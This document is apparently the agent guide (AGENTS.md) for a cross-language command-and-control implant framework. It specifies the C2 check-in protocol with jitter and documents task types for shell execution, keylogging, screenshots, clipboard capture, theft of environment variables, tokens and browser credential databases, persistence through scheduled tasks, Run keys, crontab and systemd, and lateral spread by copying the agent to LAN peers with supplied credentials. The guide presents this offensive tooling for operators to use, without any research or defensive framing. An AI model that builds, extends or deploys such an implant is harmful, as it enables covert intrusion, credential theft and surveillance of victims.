# AGENTS.md — client / agent guide

All agents speak one wire protocol (`PROTOCOL.md`) over plain HTTP/JSON.
Every agent — script and compiled — shares the same CLI flags and must
implement the same task types with the same result fields.

## Running an agent

```
python  agent.py  --server http://HOST:PORT --token TOKEN [--interval 10] [--jitter 0] [--state FILE] [--verbose]
node    agent.js  --server http://HOST:PORT --token TOKEN [--interval 10] [--jitter 0] [--state FILE] [--verbose]
powershell agent.ps1 --server http://HOST:PORT --token TOKEN [--interval 10] [--jitter 0] [--state FILE] [--verbose]
lua     agent.lua --server http://HOST:PORT --token TOKEN [--interval 10] [--jitter 0] [--state FILE] [--verbose]
php     agent.php --server http://HOST:PORT --token TOKEN [--interval 10] [--jitter 0] [--state FILE] [--verbose]
perl    agent.pl  --server http://HOST:PORT --token TOKEN [--interval 10] [--jitter 0] [--state FILE] [--verbose]
ruby    agent.rb  --server http://HOST:PORT --token TOKEN [--interval 10] [--jitter 0] [--state FILE] [--verbose]
bash    agent.sh  --server http://HOST:PORT --token TOKEN [--interval 10] [--jitter 0] [--state FILE] [--verbose]
```

Compiled agents (`go`, `rust`, `c`, `cpp`, `cs`, `java`) accept the identical
flags. Every agent also answers `-h` / `--help` with its full usage.

Each agent accepts the same six environment variables as flag fallbacks:

| Env var          | Flag equivalent  | Notes |
|------------------|------------------|-------|
| `C2_SERVER`      | `--server`       | base URL of the server |
| `C2_TOKEN`       | `--token`        | shared agent token |
| `C2_INTERVAL`    | `--interval`     | heartbeat interval in seconds |
| `C2_JITTER`      | `--jitter`       | max random jitter added to interval |
| `C2_STATE_FILE`  | `--state`        | path to the JSON state file (default `~/.c2agent.json`) |
| `C2_VERBOSE`     | `--verbose`      | set to `1` or `true` for verbose logging |

Explicit flags always win over env vars. Additional env vars recognized by
`agent.sh` (Bash): `C2_DBG` (extra debug output).

- The server URL should point at the port the server was started with
  (Windows default `8000`, Unix/WSL default `8001`).
- The token is the value of `server/.agent_token` (matches the Generate page).
- `--state FILE` persists the agent id; restarting with the same file keeps the
  same agent id on the server.

## Lifetime

1. `/api/register` — post `hostname`, `username`, `os`, `arch`, `pid`, `ip`,
   `type`, `version`; server assigns and returns `agent_id` (persist it).
2. `/api/checkin` — every `interval±jitter` seconds with `{"agent_id":...}`;
   server replies `{"tasks":[...]}`. If the server responds `404`, **re-register**
   (the id was lost server-side).
3. For each task, execute it, then POST `/api/result` with the task id, output,
   exit code and optional error. Unacknowledged tasks are retried server-side,
   so idempotent handling of `download`/`upload` is expected.

## Task types

| Type        | Args                                        | Notes |
|-------------|---------------------------------------------|-------|
| `shell`     | `command`, `timeout` (default 120)          | run via the platform shell |
| `download`  | `file`, `destination`                       | push staged file from server to agent |
| `upload`    | `path`                                      | pull a file from agent to server (`progress` optional) |
| `keylog`    | `action`: `start` / `stop` / `dump`         | start runs a background logger; dump returns buffer (max ~8000 chars) |
| `sleep`     | `seconds`                                   | change interval |
| `steal`     | `profile`: `all` / `env` / `tokens` / `browser` | collect env/creds/browser DBs, zip+upload as `steal.zip` |
| `clone`     | `action`: `start` / `stop` / `status`, `target`, `command`, `interval` | become a watcher that relaunches the target when stale/dead |
| `clipboard` | `action`: `get` / `set`, `text`             | set requires `text` |
| `screenshot`| `name` (optional)                           | upload a PNG screenshot |
| `persistence` | — (optional `method`)                    | copy self + register logon/reboot hook re-launching with the same `--server/--token/--interval/--jitter` (Windows scheduled task `c2agent-persist` + HKCU Run fallback; Linux/macOS `@reboot` crontab + systemd --user unit) |
| `lateral`   | `subnet` (CIDR), `user`, `pass` (or env `C2_LAT_USER`/`C2_LAT_PASS`) | discover LAN peers via `arp -a`/`ip neigh`, then best-effort copy + launch this agent on each (`net use`/`sshpass scp`); per-peer status + `deployed/failed/skipped` summary |
| `exit`      | —                                          | terminate gracefully |

## Platform notes (verified matrix)

Cross-platform stability is checked live on **Windows** (host) and **Linux**
(WSL) for every script agent, and by code review on **macOS**:

- Clipboard: Windows WiN32 API / `clip`; Linux `xclip`-then-`wl-paste`-then
  `xsel`; macOS `pbcopy`/`pbpaste`.
- Screenshot: Windows via ctypes GDI; Linux `import`/`scrot`/`gnome-screenshot`;
  macOS `screencapture -x`.
- Keylog: Windows `GetAsyncKeyState`/pynput; Linux `xinput`/`/dev/input` or
  pynput; macOS **unsupported** — return
  `error: keylogger not supported on macOS` instead of crashing.
  Python agent uses `pynput` on all three (needs the dependency installed, and
  an Accessibility grant on macOS).
- steal: browser "Login Data" etc. are copied **raw** (encrypted at rest);
  paths differ per OS (Windows `%LOCALAPPDATA%`, macOS
  `~/Library/Application Support`, Linux `~/.config`).
- `agent.sh` needs `curl` + `jq` (or `python3`); `local_ip()` has ip/`hostname -I`/
  ifconfig/macos-BSD fallbacks; `os` is reported as `windows|macos|linux`.

## Installing as a service (persistence-friendly)

- Windows: `agent-service.ps1` — **single-file**; the scheduled task / `sc`
  service re-invokes this same script with the `watch` action (no separate
  `c2agent-watch.ps1`). Manage with `install/start/stop/restart/status/
  uninstall/relaunch/watch`.
- Unix: `agent-service.sh` — systemd/cron/launchd unit.

## Adding a new agent language

A new `agent.X` must implement at minimum: register/checkin/result, `shell`,
`upload`, `download`, and return the same JSON shapes. Keep `--interval`,
`--jitter`, `--state` and `--verbose` flags identical, add `-h`/`--help`,
accept all six `C2_*` environment variables as flag fallbacks, persist the id,
and re-register on a 404. Then add its one-liner/installer wiring in
`server/main.py` (builder helpers + the `AGENT_FILES` map) and the
`server/templates/generate.html` language picker.

## Server-side build toolchains

The Generate Agent page lets operators cross-compile compiled agents
(Go, Rust, C, C++, C#, Java) before serving them. The required toolchains
are detected at install time by `install.ps1` / `install.sh`:

| Toolchain | What the server probes | Install hints |
|-----------|------------------------|---------------|
| Go        | `go`                   | `winget install GoLang.Go` / `apt-get install golang` / `brew install go` |
| Rust      | `cargo`                | `winget install Rustlang.Rustup` / `apt-get install rustc cargo` / `brew install rust` |
| C / C++   | `gcc` / `g++` / `clang` + libcurl | `winget install BrechtSanders.WinLibs.POSIX.UCRT` / `apt-get install build-essential libcurl4-openssl-dev` / `brew install gcc` |
| .NET SDK  | `dotnet`               | `winget install Microsoft.DotNet.SDK.8` / `apt-get install dotnet-sdk-8.0` / `brew install dotnet`; Unix: `./dotnet-install.sh` at repo root |
| Java      | `javac`                | `winget install Oracle.JDK` / `apt-get install openjdk-17-jdk` / `brew install openjdk` |

On Linux/macOS, the bundled `dotnet-install.sh` installs the SDK to
`~/.dotnet` without root and persists the PATH to the shell profile.
The server probes `~/.dotnet` directly, so it finds the SDK even before
a new shell is opened.